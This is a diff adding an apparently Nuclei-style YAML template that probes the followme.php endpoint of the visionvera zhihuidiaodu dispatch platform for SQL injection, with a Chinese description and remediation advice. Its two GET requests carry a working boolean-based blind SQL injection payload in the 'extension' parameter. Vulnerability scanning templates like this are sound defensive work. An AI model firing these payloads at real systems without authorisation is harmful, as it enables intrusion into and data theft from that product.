@@ -1,0 +1,44 @@
+id: visionverazhihuidiaodu-followme-php-sqli
+
+info:
+  name: visionvera zhihuidiaodu followme.phpSQLi
+  author: bl
+  severity: high
+  tags: 指挥调度管理平台
+  description: |-
+    本检测规则针对 visionvera zhihuidiaodu 的 followme.php 端点进行 SQL 注入探测。攻击者可能利用该接口的输入参数构造恶意 SQL 片段，改变后端数据库查询逻辑，进而造成敏感信息泄露、数据完整性破坏或越权操作。具体危害程度受目标版本、运行环境及接口暴露范围影响。
+  remediation: >-
+    所有数据库访问均应使用参数化查询或安全的 ORM，按照允许列表校验输入，并为应用配置最小权限的数据库账号。升级到厂商已修复的版本，在完成修复前限制对受影响端点的访问。
+  
+variables:
+  r0: '{{rand_int(10000, 99999)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/custom/zx/followme.php?extension={{r0}}''||if(ord(mid(md5(1),1,1))=99,1,0)||'''
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: regex
+        regex:
+          - "^0$"
+        part: body
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/custom/zx/followme.php?extension={{r0}}''||if(ord(mid(md5(1),1,1))=100,1,0)||'''
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "^-1$"
+        part: body
